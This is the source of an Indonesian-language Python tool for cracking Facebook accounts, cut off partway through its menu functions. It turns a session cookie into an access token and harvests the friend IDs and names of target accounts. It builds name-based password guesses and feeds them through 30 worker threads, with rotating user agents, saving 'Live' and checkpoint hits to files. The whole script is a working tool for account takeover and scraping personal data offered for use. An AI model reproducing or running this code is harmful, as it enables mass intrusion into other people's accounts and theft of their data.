###-----[ IMPORT MODULE ]-----###
import requests,json,os,sys,random,datetime,time,re,uuid,subprocess,zlib,base64
from time import time as tod
from time import sleep
from concurrent.futures import ThreadPoolExecutor as tred
from bs4 import BeautifulSoup as par
from urllib import request
from platform import platform
from urllib.error import URLError
ses = requests.Session()
###-----[ IMPORT RICH ]-----###
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
from rich.markdown import Markdown as mark
from rich.console import Console as sol
from rich.panel import Panel as panel
from rich import print as prints
from rich.tree import Tree
from rich.console import Console
from rich.columns import Columns
wa = Console()
id,uid,uid2,id3,id4,id5,id6=[],[],[],[],[],[],[]
loop,ok,cp=0,0,0
akun,method=[],[]
uadia, uadarimu = [],[]
password_list,password_input= [],[]
pwpluss,pwnya=[],[]
ugen = []
rr = random.randint
rc = random.choice
###-----[ USERAGENT MENU ]-----###
def generateuseragentmozilla():
	andro = random.choice(['12','13','14'])
	redmi = random.choice(['2201123G Build/TKQ1.220807.001','2201123G Build/SKQ1.211006.001','2207122MC Build/TP1A.220624.014','220333QL Build/SKQ1.211103.001','2201116SG Build/TKQ1.221114.001','MI 9 Build/QKQ1.190825.002','2201116SG Build/SKQ1.211006.001','Redmi Note 11 Pro 5G Build/RKQ1.211001.001','22041216UC Build/TP1A.220624.014'])
	realme = random.choice(['RMX3700 Build/UKQ1.230924.001','RMX3890 Build/UKQ1.230917.001','RMX3782 Build/TP1A.220905.001','RMX3041 Build/RP1A.200720.011','RMX3834 Build/TP1A.220624.014','RMX3782 Build/TP1A.220905.001','RMX3710 Build/SP1A.210812.016','RMX3782 Build/TP1A.220905.001','RMX3551 Build/SKQ1.221119.001'])
	crom = random.choice(['100','114','111','113'])
	rom = random.choice(['5872','6871','8487','8173','1989'])
	rom2 = random.choice(['100','101','102','103','104','105','106','107','108','109'])
	re = random.choice(['id-ID','en-US','ja-JP','el-GR','ru-RU','th-TH','tr-TR'])
	bjir = random.choice(['2819','2817','2853','2843','8372','8379','6681'])
	bjir2 = random.choice(['6187','8361','9571','9473','9183','9843','5678'])
	user1 = f"Mozilla/5.0 (Linux; U; Android {andro}; {redmi}; {re}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{crom}.0.{rom}.{rom2} Mobile Safari/537.36 XiaoMi/Mint Browser/1.2.1"
	user2 = f"Dalvik/2.1.0 (Android {andro}; {realme}) [FBAN/MessengerLite;FBAV/;FBPN/com.facebook.mlite;FBLC/{re};FBBV/{bjir}{bjir2};FBCR/Airtel ;FBMF/LGE;FBBD/lge;Facebook/L-03K;FBSV/9;FBCA"
	uaappend = rc([user1,user2])
	return uaappend
prints(panel(f"[green]{generateuseragentmozilla()}[/]",title=f"[[green][/]]",style=f"bold white"));time.sleep(3)
#prints(generateuseragentmozilla());time.sleep(3)
###-----[ MENU WARNA PRINT BIASA ]-----###
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'	# WARNA MATI
###-----[ MENU WARNA PRINT RICH ]-----###
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
P2 = "[#FFFFFF]" # PUTIH
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU 
###-----[ TANGGAL BULAN TAHUN ]-----###
dic = {'1':'Januari','2':'Februari','3':'Maret','4':'April','5':'Mei','6':'Juni','7':'July','8':'Agustus','9':'September','10':'Oktober','11':'November','12':'Desember'}
dic2 = {'01':'Januari','02':'Februari','03':'Maret','04':'April','05':'Mei','06':'Juni','07':'July','08':'Agustus','09':'September','10':'Oktober','11':'November','12':'Desember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'Live-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'Chek-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
def waktu():
	now = datetime.datetime.now()
	hours = now.hour
	if 4 <= hours < 12:timenow = "Selamat Pagi 👋"
	elif 12 <= hours < 15:timenow = "Selamat Siang 👋"
	elif 15 <= hours < 18:timenow = "Selamat Sore 👋"
	else:timenow = "Selamat Malam 👋"
	return timenow
###-----[ CLEAR DISPLAY ]-----###
def clear():
	if "linux" in sys.platform.lower():
		try:os.system("clear")
		except:pass
	elif "win" in sys.platform.lower():
		try:os.system("cls")
		except:pass
	else:
		try:os.system("clear")
		except:pass
def back():
	menu()
###-----[ LOGO BANNER ]-----###
def banner():
	print(f"""{H} ___________                     __________                __          
 \_   _____/____    _________.__.\______   \_______ __ ___/  |_  ____  
  |    __)_\__  \  /  ___<   |  | |    |  _/\_  __ \  |  \   __\/ __ \ 
  |     ___\/ __ \_\___ \ \___  | |    |   \ |  | \/  |  /|  | \  ___/ 
 /_______  (____  /____  >/ ____| |______  / |__|  |____/ |__|  \___  >
         \/     \/     \/ \/             \/                         \/ 
{K}[ MEMEK {P}]{P} """)
###-----[ LOGIN COOKIES ]-----###
def login():
	clear();banner()
	print(f"\n{P} [:] masukan cookie anda, disarankan menggunakan akun tumbal. {P}")
	print(f" [:] untuk menu crack tanpa login ,ketik 'nologin' pada kolom input.")
	cok = input(f" [:] cookie : {H}")
	if cok in ["Nologin","NOLOGIN","nologin"]:
		menu = input(f"\n{P} [1]. crack dari file. \n [2]. dump id dari email. \n [3]. dump id dari pencarian nama. \n [4]. cek hasil crack. \n [:] pilih 1/4 : ")
		if menu in ["01","1"]:
			Crack_file()
		elif menu in ["02","2"]:
			exit(" [:] fitur ini masih dalam tahap pengembangan.")
		elif menu in ["03","3"]:
			exit(" [:] fitur ini masih dalam tahap pengembangan.")
		elif menu in ["04","4"]:
			Result()
		else:
			exit(" [:] input hanya dengan angka,jangan kosong.")
	else:
		try:
			url = "https://mbasic.facebook.com"
			link = ses.post("https://graph.facebook.com/v16.0/device/login/", data={"access_token": "1348564698517390|007c0a9101b9e1c8ffab727666805038", "scope": ""}).json()
			kode = link["code"];user = link["user_code"]; data, data2 = {}, {}
			vers = par(ses.get(f"{url}/device?user_code={user}", cookies={"cookie": cok}).text, "html.parser")
			item = ["fb_dtsg","jazoest","qr"]
			for x in vers.find_all("input"):
				if x.get("name") in item:
					aset = {x.get("name"):x.get("value")}
					data.update(aset)
			data.update({"user_code":user})
			meta = par(ses.post(url+vers.find("form", method="post").get("action"), data=data, cookies={"cookie": cok}).text, "html.parser")
			xzxz = ["fb_dtsg","jazoest","scope","display","sdk","sdk_version","domain","sso_device","user_code","logger_id","auth_type","auth_nonce","code_challenge","code_challenge_method","encrypted_post_body","return_format[]"]
			for xz in meta.find_all("input"):
				if xz.get("name") in xzxz:
					data2.update({xz.get("name"):xz.get("value")})
				else:pass
			data2.update({"submit":"Konfirmasi"})
			konfirmasi = ses.post(url+meta.find("form", method="post").get("action"), data=data2, cookies={"cookie": cok}).text
			if "Login Anda sudah dikonfirmasi di" in konfirmasi or "Sukses!" in konfirmasi:
				find = ses.get(f"https://graph.facebook.com/v16.0/device/login_status?method=post&code={kode}&access_token=1348564698517390%7C007c0a9101b9e1c8ffab727666805038&callback=LeetsharesCallback", cookies={"cookie": cok}).text
				tokz = re.search('"access_token":"(.*?)"', find).group(1)
				open('.token.txt', 'a').write(tokz);open('.cok.txt', 'a').write(cok)
				exit(f"{P} [:] token : {H}{tokz}{P} \n [:] cookies aktif,jalankan ulang perintah nya dengan ketik python run.py")
		except Exception as e:exit(e)
###-----[ LOGIN COOKIES V2 ]-----###
def login2():
	clear();banner()
	print(f"\n{P} [:] masukan cookie anda, disarankan menggunakan akun tumbal. {P}")
	print(f" [:] untuk menu crack tanpa login ,ketik 'nologin' pada kolom input.")
	cok = input(f" [:] cookie : {H}")
	if cok in ["Nologin","NOLOGIN","nologin"]:
		menu = input(f"\n{P} [1]. crack dari file. \n [2]. dump id dari email. \n [3]. dump id dari pencarian nama. \n [4]. cek hasil crack. \n [:] pilih 1/4 : ")
		if menu in ["01","1"]:
			Crack_file()
		elif menu in ["02","2"]:
			exit(" [:] fitur ini masih dalam tahap pengembangan.")
		elif menu in ["03","3"]:
			exit(" [:] fitur ini masih dalam tahap pengembangan.")
		elif menu in ["04","4"]:
			Result()
		else:
			exit(" [:] input hanya dengan angka,jangan kosong.")
	else:
		try:
			url = "https://mbasic.facebook.com"
			data, data2 = {}, {}
			link = ses.post("https://graph.facebook.com/v16.0/device/login/", data={"access_token": "661587963994814|ffe07cc864fd1dc8fe386229dcb7a05e", "scope": ""}).json()
			kode = link["code"];user = link["user_code"]
			vers = par(ses.get(f"{url}/device", cookies={"cookie": cok}).content, "html.parser")
			item = ["fb_dtsg","jazoest","qr"]
			for x in vers.find_all("input"):
				if x.get("name") in item:
					aset = {x.get("name"):x.get("value")}
					data.update(aset)
			data.update({"user_code":user})
			meta = par(ses.post(url+vers.find("form", method="post").get("action"), data=data, cookies={"cookie": cok}).text, "html.parser")
			xzxz  = meta.find("form",{"method":"post"})
			for x in xzxz("input",{"value":True}):
				try:
					if x["name"] == "__CANCEL__" : pass
					else:data2.update({x['name']:x['value']})
				except Exception as e: pass
			ses.post(f"{url}{xzxz['action']}", data=data2, cookies={"cookie":cok})
			tokz = ses.get(f"https://graph.facebook.com/v16.0/device/login_status?method=post&code={kode}&access_token=661587963994814|ffe07cc864fd1dc8fe386229dcb7a05e").json()
			open('.token.txt', 'a').write(tokz['access_token']);open('.cok.txt', 'a').write(cok)
			exit(f"{P} [:] token : {H}{tokz['access_token']}{P} \n [:] cookies aktif,jalankan ulang perintah nya dengan ketik python run.py")
		except Exception as e:exit(e)
###-----[ LOGIN COOKIES V2 ]-----###
def login3():
	clear();banner()
	print(f"\n{P} [:] masukan cookie anda, disarankan menggunakan akun tumbal. {P}")
	print(f" [:] untuk menu crack tanpa login ,ketik 'nologin' pada kolom input.")
	cok = input(f" [:] cookie : {H}")
	if cok in ["Nologin","NOLOGIN","nologin"]:
		menu = input(f"\n{P} [1]. crack dari file. \n [2]. dump id dari email. \n [3]. dump id dari pencarian nama. \n [4]. cek hasil crack. \n [:] pilih 1/4 : ")
		if menu in ["01","1"]:
			Crack_file()
		elif menu in ["02","2"]:
			exit(" [:] fitur ini masih dalam tahap pengembangan.")
		elif menu in ["03","3"]:
			exit(" [:] fitur ini masih dalam tahap pengembangan.")
		elif menu in ["04","4"]:
			Result()
		else:
			exit(" [:] input hanya dengan angka,jangan kosong.")
	else:
		try:
			head = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36"}
			link = ses.get("https://web.facebook.com/adsmanager?_rdc=1&_rdr", headers=head, cookies={"cookie": cok})
			find = re.findall('act=(.*?)&nav_source', link.text)
			if len(find) == 0:print(f'{P} [:] cookie kamu invalid silahkan menggunakan tumbal/cookies lain.');time.sleep(2);exit()
			else:
				for x in find:
					xz = ses.get(f"https://web.facebook.com/adsmanager/manage/campaigns?act={x}&nav_source=no_referrer", headers = head, cookies={"cookie": cok})
					took = re.search('(EAAB\w+)',xz.text).group(1)
					open('.token.txt', 'a').write(took);open('.cok.txt', 'a').write(cok)
					exit(f"{P} [:] token : {H}{took}{P} \n [:] cookies aktif,jalankan ulang perintah nya dengan ketik python run.py")
		except Exception as e:exit(e)
###-----[ MENU SCRIPT ]-----###
def menu():
	clear();banner()
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except (IOError,KeyError,FileNotFoundError):
		print(f'\n{P} [%] cookies kamu invalid.{P}')
		time.sleep(3);os.system('clear')
		login()
	try:
		info_datafb = ses.get(f"https://graph.facebook.com/me?fields=name,id&access_token={token}", cookies = {'cookies':cok}).json()
		nama = info_datafb["name"]
		uidfb = info_datafb["id"]
	except requests.exceptions.ConnectionError:
		exit(f"\n{P} [%] Tidak ada koneksi{P}")
	except KeyError:
		try:os.remove(".cok.txt");os.remove(".token.txt")
		except:pass
		print(f"\n{P} [%] sepertinya akun tumbal mu terkena checkpoint...{P}");time.sleep(3)
		os.system('clear')
		login()
	print(f"\n [%] uid facebook  : {uidfb} \n [%] nama facebook : {nama}")
	print(f"\n{P} [1]. crack dari id publik. \n [2]. crack dari id publik {H}massal{P}. \n [3]. crack id dari file. \n [4]. dump id ke file. \n [5]. dump otomatis. \n [0]. keluar {M}hapus cookies{P}. {P}")
	menu = input(f'\n{P} [%] pilih 1/5 : ')
	if menu in ["01","1"]:
		try:
			token = open('.token.txt','r').read()
			cok = open('.cok.txt','r').read()
		except IOError:
			exit()
		print(f"\n{P} [%] pastikan id target tidak private/publik. {P}")
		user_dump = input(f' [%] input id target : ')
		uid.append(user_dump)
		for userr in uid:
			try:
				col = ses.get(f'https://graph.facebook.com/{userr}?fields=friends&access_token={token}',cookies = {'cookies':cok}).json()
				for x in col['friends']['data']:
					try:
						sys.stdout.write(f"\r [%] sedang mengumpulkan id, sukses mengumpulkan {H}{len(id)}{P} id....{P}"),
						sys.stdout.flush()
						id.append(x['id']+'|'+x['name'])
					except:continue
			except (KeyError,IOError):
				pass
			except requests.exceptions.ConnectionError:
				print(f' [%] koneksi buruk, silahkan refresh jaringan anda. ')
				exit()
		try:
			setting()
		except requests.exceptions.ConnectionError:
			print(f'\n [%] koneksi buruk, silahkan refresh jaringan anda. ')
			exit()
	elif menu in ["02","2"]:
		Dump_Massal()
	elif menu in ["03","3"]:
		Crack_file()
	elif menu in ["04","4"]:
		Dump_id()
	elif menu in ["05","5"]:
		Dump_teman()
	elif menu in ['00','0']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt')
		print(f' [%] Berhasil Keluar+Hapus Cookie ')
		exit()
	else:
		print(f" [%] input hanya dengan angka,jangan kosong.")
		time.sleep(3)
		back()
###-----[ MENU RESULT ]-----###
def Result():
	print(f"\n{P} [1]. cek hasil akun {H}Live{P}. \n [2]. cek hasil akun {K}Chek{P}. \n [3]. kembali.")
	lihat_result = input(f'\n [%] pilih 1/3 : ')
	if lihat_result in ['2']:
		try:vin = os.listdir('Chek')
		except FileNotFoundError:
			print(f' [%] file tidak ditemukan ')
			time.sleep(2)
			back()
		if len(vin)==0:
			print(f' [%] anda tidak memiliki file {K}Check {P}')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('Chek/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'{P} [%s]. %s ( {K}%s{P} id )'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print(f'{P} [%s]. %s ( {K}%s{P} id )'%(cih,isi,len(hem)))
			geeh = input(f'\n [%] masukan nomer result yang ingin anda cek : ')
			try:geh = lol[geeh]
			except KeyError:
				print(f' [%] pilih dengan benar ')
				back()
			try:lin = open('Chek/'+geh,'r').read().splitlines()
			except:
				print(f' [%] file tidak ditemukan ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				result_=lin[nocp].split('|')
				tree = Tree("")
				tree.add(f"{K2}{result_[0]}|{result_[1]}[white]")
				prints(tree)
				nocp +=1
			print('')
			input(f' [%] ketik enter jika ingin kembali ke menu')
			os.system("clear")
			time.sleep(3)
			back()
	elif lihat_result in ['1']:
		try:vin = os.listdir('Live')
		except FileNotFoundError:
			print(f' [%] file tidak ditemukan ')
			time.sleep(2)
			back()
		if len(vin)==0:
			print(f' [%] anda tidak memiliki file {H}Live {P}')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('Live/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'{P} [%s]. %s ( {H}%s{P} id )'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print(f'{P} [%s]. %s ( {H}%s{P} id )'%(cih,isi,len(hem)))
			geeh = input(f'\n [%] masukan nomer result yang ingin anda cek : ')
			try:geh = lol[geeh]
			except KeyError:
				print(f' [%] pilih dengan benar ')
				back()
			try:lin = open('Live/'+geh,'r').read().splitlines()
			except:
				print(f' [%] file tidak ditemukan ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				result_=lin[nocp].split('|')
				tree = Tree("")
				tree.add(f"{H2}{result_[0]}|{result_[1]}[white]").add(f"{H2}{result_[2]}[white]")
				prints(tree)
				nocp +=1
			print("")
			input(f' [%] ketik enter jika ingin kembali ke menu')
			os.system("clear")
			time.sleep(3)
			back()
	elif lihat_result in ['3']:
		back()
	else:
		print(f" [%] input hanya dengan angka,jangan kosong.")
		back()
###-----[ DUMP PUBLIK MASSAL ]-----###
def Dump_Massal():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		print(f"\n{P} [%] pastikan id target tidak private/publik. {P}")
		jum = int(input(f' [%] input jumlah target ? : '))
	except ValueError:
		print(f' [%] input salah ')
		exit()
	if jum<1 or jum>100:
		print(f' [%] gagal dump id kemungkinan id bukan publik/private ')
		exit()
	ses=requests.Session()
	jumlah_input = 0
	for met in range(jum):
		jumlah_input+=1
		user_dump = input(f' [%] input id ke '+str(jumlah_input)+' : ')
		uid.append(user_dump)
	for userr in uid:
		try:
			col = ses.get(f'https://graph.facebook.com/{userr}?fields=friends&access_token={token}',cookies = {'cookies':cok}).json()
			for x in col['friends']['data']:
				try:
					sys.stdout.write(f"\r [%] sedang mengumpulkan id, sukses mengumpulkan {H}{len(id)}{P} id....{P}"),
					sys.stdout.flush()
					id.append(x['id']+'|'+x['name'])
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print(f' [%] koneksi sinyal tidak stabil ')
			exit()
	try:
		setting()
	except requests.exceptions.ConnectionError:
		print('')
		print(f' [%] koneksi sinyal tidak stabil ')
		back()
###-----[ DUMP FILE ]-----###
def Dump_id():
	file = input(f"\n [%] masukan nama file dump anda : ")
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		print(f"\n{P} [%] pastikan id target tidak private/publik. {P}")
		jum = int(input(f' [%] input jumlah target ? : '))
	except ValueError:
		print(f' [%] input salah ')
		exit()
	if jum<1 or jum>100:
		print(f' [%] gagal dump id kemungkinan id bukan publik/private ')
		exit()
	ses=requests.Session()
	jumlah_input = 0
	for met in range(jum):
		jumlah_input+=1
		user_dump = input(f' [%] input id ke '+str(jumlah_input)+' : ')
		uid.append(user_dump)
	for userr in uid:
		try:
			col = ses.get(f'https://graph.facebook.com/{userr}?fields=friends&access_token={token}',cookies = {'cookies':cok}).json()
			for x in col['friends']['data']:
				try:
					sys.stdout.write(f"\r [%] sedang mengumpulkan id, sukses mengumpulkan {H}{len(id)}{P} id....{P}"),
					sys.stdout.flush()
					id.append(x['id']+'|'+x['name'])
					open(file,'a').write(x['id']+'|'+x['name']+'\n')
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print(f' [%] koneksi sinyal tidak stabil ')
			exit()
	try:
		exit(f"\n [%] sukses dump file tersimpan pada : {file}")
	except KeyError:
		print(f"\n [%] gagal dump, kemungkinan id tidak publik/cookies anda invalid")
	except requests.exceptions.ConnectionError:
		print('')
		print(f' [%] koneksi sinyal tidak stabil ')
		back()
###-----[ CRACK FILE ]-----###
def Crack_file():
	file = input(f"\n [%] masukan nama folder/file : ")
	try:
		uid = open(file,"r").read().splitlines()
		for data in uid:
			try:user,nama = data.split('|')
			except:continue
			sys.stdout.write(f"\r [%] sedang mengumpulkan id, sukses mengumpulkan {H}{len(id)}{P} id....{P}"),
			sys.stdout.flush()
			id.append(data)
	except FileNotFoundError:exit(f" [%] file tidak ada")
	setting()
###-----[ DUMP OTOMATIS ]-----###
def Dump_teman():
	print()
	print(f'{M} [:] Mode pesawat jika ingin stop Dump !!!{P}')
	user = input(' [:] Input target id : ')
	dumpx(user)
	setting2()
	for userr in id4:
		print(f'\n{P} [:] sedang dump id : {userr}{P}')
		dumpy(userr)
	setting()

def dumpy(userr):
    try:
        token = open('.token.txt','r').read()
        cok = open('.cok.txt','r').read()
    except IOError:
        exit()
    try:
        head = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0'}
        koh2 = ses.get(f"https://graph.facebook.com/{userr}?fields=friends&access_token={token}",cookies={'cookie': cok},headers=head).json()
        for pi in koh2['friends']['data']:
            try:
                sys.stdout.write(f"\r [:] sedang mengumpulkan id, sukses mengumpulkan {H}{len(id)}{P} id....{P}"),
                sys.stdout.flush()
                iso=(pi['id']+'|'+pi['name'])
                if "19"  in iso:pass
                elif "18"  in iso:pass
                elif "17"  in iso:pass
                elif "16"  in iso:pass
                elif "15"  in iso:pass
                elif "14"  in iso:pass
                elif "13"  in iso:pass
                elif "12"  in iso:pass
                elif "11"  in iso:pass
                elif "110"  in iso:pass
                elif "109"  in iso:pass
                elif "108"  in iso:pass
                elif "107"  in iso:pass
                elif "106"  in iso:pass
                elif "105"  in iso:pass
                elif "104"  in iso:pass
                elif "103"  in iso:pass
                elif "102"  in iso:pass
                elif "101"  in iso:pass
                else:id.append(iso)
            except:pass
    except requests.exceptions.ConnectionError:
        setting()
    except (KeyError,IOError):
        pass

def setting2():
	for bacot in id3:
		xx = random.randint(0,len(id4))
		id4.insert(xx,bacot)

def dumpx(user):
    try:
        token = open('.token.txt','r').read()
        cok = open('.cok.txt','r').read()
    except IOError:
        exit()
    try:
        head = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0'}
        koh2 = ses.get(f"https://graph.facebook.com/{user}?fields=friends&access_token={token}",cookies={'cookie': cok},headers=head).json()
        for pi in koh2['friends']['data']:
            try:
                iso=(pi['id'])
                if "10009"  in iso:pass
                if "10002"  in iso:pass
                if "10001"  in iso:pass
                elif "79"  in iso:pass
                elif "78"  in iso:pass
                elif "77"  in iso:pass
                elif "76"  in iso:pass
                elif "75"  in iso:pass
                elif "74"  in iso:pass
                elif "73"  in iso:pass
                elif "72"  in iso:pass
                elif "71"  in iso:pass
                elif "70"  in iso:pass
                elif "19"  in iso:pass
                elif "18"  in iso:pass
                elif "17"  in iso:pass
                elif "16"  in iso:pass
                elif "15"  in iso:pass
                elif "14"  in iso:pass
                elif "13"  in iso:pass
                elif "12"  in iso:pass
                elif "11"  in iso:pass
                elif "110"  in iso:pass
                elif "109"  in iso:pass
                elif "108"  in iso:pass
                elif "107"  in iso:pass
                elif "106"  in iso:pass
                elif "105"  in iso:pass
                elif "104"  in iso:pass
                elif "103"  in iso:pass
                elif "102"  in iso:pass
                elif "101"  in iso:pass
                elif "10000009"  in iso:pass
                elif "10000008"  in iso:pass
                elif "10000007"  in iso:pass
                elif "10000006"  in iso:pass
                elif "10000005"  in iso:pass
                elif "10000004"  in iso:pass
                elif "10000003"  in iso:pass
                elif "10000002"  in iso:pass
                elif "10000001"  in iso:pass
                elif "10000000"  in iso:pass
                elif "1000009"  in iso:pass
                elif "1000008"  in iso:pass
                elif "1000007"  in iso:pass
                elif "1000006"  in iso:pass
                elif "1000005"  in iso:pass
                elif "1000004"  in iso:pass
                elif "1000003"  in iso:pass
                elif "1000002"  in iso:pass
                elif "1000001"  in iso:pass
                elif "1000000"  in iso:pass
                elif "100009"  in iso:pass
                elif "100008"  in iso:pass
                elif "100007"  in iso:pass
                elif "100006"  in iso:pass
                elif "100005"  in iso:pass
                elif "100004"  in iso:pass
                elif "100003"  in iso:pass
                elif "100002"  in iso:pass
                elif "100001"  in iso:pass
                elif "100000"  in iso:pass
                elif "10009"  in iso:pass
                elif "10000"  in iso:pass
                else:id3.append(iso)
            except:pass
    except requests.exceptions.ConnectionError:
        print('PROBLEM INTERNET CONNECTION,PRESS ENTER TO CONTINUE')
        input('')
    except (KeyError,IOError):
        pass
###-----[ SETTING URUTAN & METODE ]-----###
def setting():
	print("")
	print(f"\n{P} [1]. urutan old ke new. \n [2]. urutan new ke old. \n [3]. urutan random. {P}")
	urutan_setting = input(f'\n [%] pilih 1/3 : ')
	if urutan_setting in ['1','01','old']:
		for tua in sorted(id):
			uid2.append(tua)
	elif urutan_setting in ['2','02','new']:
		muda=[]
		for new in sorted(id):
			muda.append(new)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			uid2.append(muda[bcmi])
			bcmi -=1
	elif urutan_setting in ['3','03','random']:
		for acak in id:
			xx = random.randint(0,len(uid2))
			uid2.insert(xx,acak)
	else:
		print(f" [%] input hanya dengan angka,jangan kosong.")
		exit()
	print(f"\n{P} [1]. login metode validate. \n [1]. login metode Validate V2. \n [3]. login metode Validate V3. {P}")
	login_metode = input(f'\n [%] pilih 1/3 : ')
	if login_metode in ["1","01"]:
		method.append('Validate')
	elif login_metode in ["2","02"]:
		method.append('Validate2')
	elif login_metode in ["3","03"]:
		method.append('Validate3')
	else:
		print(f" [%] input hanya dengan angka,jangan kosong.")
		exit()
	print(f"\n{P} [1]. password otomatis. \n [2]. password gabung. \n [3]. password manual. {P}")
	password_metode = input(f'\n [%] pilih 1/3 : ')
	if password_metode in ['1','01']:
		Otomatis()
	elif password_metode in ['2','02']:
		Gabung()
	elif password_metode in ['3','03']:
		Manual()
	else:
		print(f" [%] input hanya dengan angka,jangan kosong.")
		exit()
###-----[ SETTING PASSWORD OTOMATIS ]-----###
def Otomatis():
	ua = input(f' [%] ingin menggunakan user agent manual ? y/t : ')
	if ua in ['y','Ya','ya','Y']:
		uadarimu.append('uadia');bz = input(f' [%] input user agent manual anda : ');uadia.append(bz)
	if ua in ['t','T','']:
		print(f"{P} [%] anda menggunakan user agent bawaan script. {P}")
	else:uadarimu.append('uasc')
	print(f"""
 [%] {P}hasil Live akan tersimpan di : {H}Live/{okc}{P}
 [%] {P}hasil Chek akan tersimpan di : {K}Chek/{cpc}{P}
 [%] mainkan mode pesawat jika tidak ada hasil.
""")
	global prog,des
	prog = Progress(TextColumn('{task.description}'),BarColumn(),TextColumn("[progress.percentage]{task.percentage:>3.0f}%"))
	des = prog.add_task('',total=len(uid2))
	with prog:
		with tred(max_workers=30) as MethodeCrack:
			for user in uid2:
				uid,nama = user.split('|')[0],user.split('|')[1].lower()
				depan = nama.split(" ")
				try:
					if len(nama) <=5:
						if len(depan) <=1 or len(depan) <=2:pass
						else:
							pasw = [nama,depan[0]+"123",depan[0]+"1234",depan[0]+"12345"]
					else:
						pasw = [nama,depan[0]+"123",depan[0]+"1234",depan[0]+"12345"]
					if 'Validate' in method:
						MethodeCrack.submit(Validate,uid,pasw)
					elif 'Validate2' in method:
						MethodeCrack.submit(Validate2,uid,pasw)
					elif 'Valodate3' in method:
						MethodeCrack.submit(Validate3,uid,pasw)
					else:
						MethodeCrack.submit(Validate3,uid,pasw)
				except:pass
		print("\r")
		exit(f"{P} [%] sukses crack {H}{len(uid2)}{P} id,dengan jumlah hasil Live : {H}{ok} {P}Chek : {K}{cp}{P}")
###-----[ SETTING PASSWORD GABUNG ]-----###
def Gabung():
	pw_manual=input(f'\n [%] input password tambahan anda : ')
	password_manual=pw_manual.split(',')
	for xpw in password_manual:
		pwnya.append(xpw)
	ua = input(f' [%] ingin menggunakan user agent manual ? y/t : ')
	if ua in ['y','Ya','ya','Y']:
		uadarimu.append('uadia');bz = input(f' [%] input user agent manual anda : ');uadia.append(bz)
	if ua in ['t','T','']:
		print(f"{P} [%] anda menggunakan user agent bawaan script. {P}")
	else:uadarimu.append('uasc')
	print(f"""
 [%] {P}hasil Live akan tersimpan di : {H}Live/{okc}{P}
 [%] {P}hasil Chek akan tersimpan di : {K}Chek/{cpc}{P}
 [%] mainkan mode pesawat jika tidak ada hasil.
""")
	global prog,des
	prog = Progress(TextColumn('{task.description}'),BarColumn(),TextColumn("[progress.percentage]{task.percentage:>3.0f}%"))
	des = prog.add_task('',total=len(uid2))
	with prog:
		with tred(max_workers=30) as MethodeCrack:
			for user in uid2:
				uid,nama = user.split('|')[0],user.split('|')[1].lower()
				depan = nama.split(" ")
				try:
					if len(nama) <=5:
						if len(depan) <=1 or len(depan) <=2:pass
						else:
							pasw = [nama,depan[0]+"1234",depan[0]+"123@"]
					else:
						pasw = [nama,depan[0]+"1234",depan[0]+"123@"]
					for xpwd in pwnya:
						pasw.append(xpwd)
					if 'Validate' in method:
						MethodeCrack.submit(Validate,uid,pasw)
					elif 'Validate2' in method:
						MethodeCrack.submit(Validate2,uid,pasw)
					elif 'Validate3' in method:
						MethodeCrack.submit(Validate3,uid,pasw)
					else:
						MethodeCrack.submit(Validate3,uid,pasw)
				except:pass
		print("\r")
		exit(f"{P} [%] sukses crack {H}{len(uid2)}{P} id,dengan jumlah hasil Live : {H}{ok} {P}Chek : {K}{cp}{P}")
###-----[ SETTING PASSWORD MANUAL ]-----###
def Manual():
	pw_manual=input(f'\n [%] input password manual anda : ')
	password_manual=pw_manual.split(',')
	for xpw in password_manual:
		pwnya.append(xpw)
	ua = input(f' [%] ingin menggunakan user agent manual ? y/t : ')
	if ua in ['y','Ya','ya','Y']:
